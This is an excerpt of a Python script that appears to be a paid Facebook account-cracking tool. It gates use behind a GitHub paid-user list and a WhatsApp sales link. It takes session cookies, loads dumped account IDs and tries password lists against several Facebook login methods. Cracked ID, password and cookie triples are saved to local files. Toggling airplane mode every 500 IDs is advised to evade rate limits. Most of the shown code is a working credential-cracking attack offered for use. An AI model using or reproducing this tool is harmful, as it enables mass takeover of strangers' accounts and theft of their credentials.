...
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'Jun','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'Jun','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
...
CODER HOOD
+2347041126122
greeting my boss whoami 
Access granted you are now a paid user

[\033[37;41m FOR BETTER SPPED PLZZ CONNECT VPN / OR BEST PROXY \033[0;m]
"""%(h))
...
def chk():
  ...
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+ak+id) 
  try: 
    httpCaht = requests.get("https://github.com/whoami242404/PROHACK1/blob/main/PAIDUSERS.txt").text 
    if id in httpCaht: 
      print("\033[92m  YOU ARE NOW A PAID USER🤝........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\n\033[0;96m YOUR ID IS NOT ACTIVE COPY👆 AND SEND ME MESSAGE ON WHATSAPP\n \033[0;91m#NOT FREE!!!") 
      os.system('xdg-open  https://wa.me/+2347041126122?text=*ASALAMUALIKUM*%2C%20*SIR-WHOAMI*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*HBF-CAMMANDS* ')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] \033[1;92mPUT YOUR COOKIES HERE : ')
...
[02] PUBLIC FRIENDS (MULTI)  [07] CHECK CHECKPOINT
[03] CRACK FROM FOLLOWERS    [08] CHECK CRACK RESULTS
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/WHOAMI-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/WHOAMI-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/WHOAMI-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/WHOAMI-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/WHOAMI-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/WHOAMI-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
# OPEN
def file():
	tek = '# CHECK CHECKPOINT FROM FILE'
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/WHOAMI-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('/sdcard/WHOAMI-DATA/OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/WHOAMI-DATA/1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/WHOAMI-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
# DUMP ID MASSAL
def dump_massal():
	mas='[01] BULK CRACK FROM FILES\n[02] MANUAL MULTI CRACK    [NOT WORKING]'
	mas2=nel(mas,style='cyan')
	cetak(nel(mas2,title=' • MULTI CRACK MENU •'))
	pilih=input('[•] CHOOSE : ')
	if pilih in ['1','01']:
		nmfil=input('[•] FILE PATH : ')
		...
		try:
			jum = int(input(x+'['+p+'f'+x+'] PUT IDZ LIMIT : '))
		except ValueError:
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/WHOAMI-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/WHOAMI-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/WHOAMI-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def setting():
	...
	ioz = '[01] METHOD MOBILE FACEBOOK OK ONE \n[02] METHOD FREE   FACEBOOK\n[03] METHOD TOUCH  FACEBOOK { PRO }\n[04] METHOD MBASIC-FACEBOOK { RECOMMEND } '
...
def passwrd():
	...
	krek = '[•] OK RESULTS SAVED IN : %s\n[•] CP RESULTS SAVED IN : %s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s[WHOAMI❤] %s/%s [OK:%s😘]=[CP:%s🥺]-[%s%s%s]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='WHOAMI-XD CP'))
					open('/sdcard/WHOAMI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/WHOAMI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='WHOAMI-XD OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]WHOAMI-XD OK[/bold green]'))
					ok+=1
					break
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s[ WHOAMI-CP🥺] %s | %s       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[WHOAMI-CP🥺] Tap Yes /TRY TO LOGIN IN Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[WHOAMI-CP🥺] %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[ WHOAMI-CP🥺] %s | %s       %s'%(b,idf,pw,x))
		print('\r%s[ CHECK   😳] TRY TO CHECK (TRY TO LOGIN IN Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s[ WHOAMI-CP🥺] %s => Error      %s'%(b,kes,x))
				print('\r%s[WHOAMI-CP🥺] Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s[WHOAMI-CP🥺] %s/%s [WHOAMI-CP🥺] { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[ WHOAMI-CP🥺] %s | %s       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[WHOAMI-CP🥺] Tap Yes /TRY TO LOGIN IN Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s[ WHOAMI-CP🥺] %s | %s=> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[ WHOAMI-CP🥺] %s | %s => [CHECK-ID]       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# ERROR IN YOUR NET SERVICE PLZ TRY AGAIN'
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/WHOAMI-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/WHOAMI-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/WHOAMI-DATA/DUMP')
	except:pass
	login()
